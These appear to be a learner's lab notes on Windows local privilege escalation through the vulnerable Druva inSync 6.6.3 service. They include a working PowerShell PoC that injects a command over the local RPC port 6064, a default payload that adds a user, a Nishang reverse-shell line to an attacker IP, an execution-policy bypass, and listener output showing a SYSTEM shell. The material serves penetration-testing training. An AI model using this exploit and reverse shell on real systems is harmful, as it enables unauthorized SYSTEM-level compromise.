We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments.
Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.

---

#### Enumerating Installed Programs

```cmd-session
> wmic product get name
```

![](Pasted%20image%2020250322030701.png)
the `Druva inSync` application stands out. A quick Google search shows that version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service. We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges. From this [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) which details the initial discovery of the flaw, we can see that Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful `NT AUTHORITY\SYSTEM` account. Escalation is possible by interacting with a service running locally on port 6064.
after researching the program, you find service running on specific port, look for the port

```cmd-session
netstat -ano | findstr 6064
```

`mapping the process id to name`

```powershell-session
get-process -Id 3324
```

one last check using the `Get-Service` cmdlet.

```powershell-session
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
```

## Druva inSync Windows Client Local Privilege Escalation Example

Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):

Vulnerable Services

```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Feel free to modify the `PoC` as needed. In this example, I've configured it to send a reverse shell. Since it runs with SYSTEM privileges, the reverse shell provides us with a SYSTEM-level shell.

Modify execution policy first:
`Set-ExecutionPolicy Bypass -Scope Process`

```
$cmd = powershell -ExecutionPolicy Bypass -File "C:\Users\JohnDoe\Desktop\script.ps1"
```

```shell-session
$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.


PS C:\WINDOWS\system32>whoami

nt authority\system

```
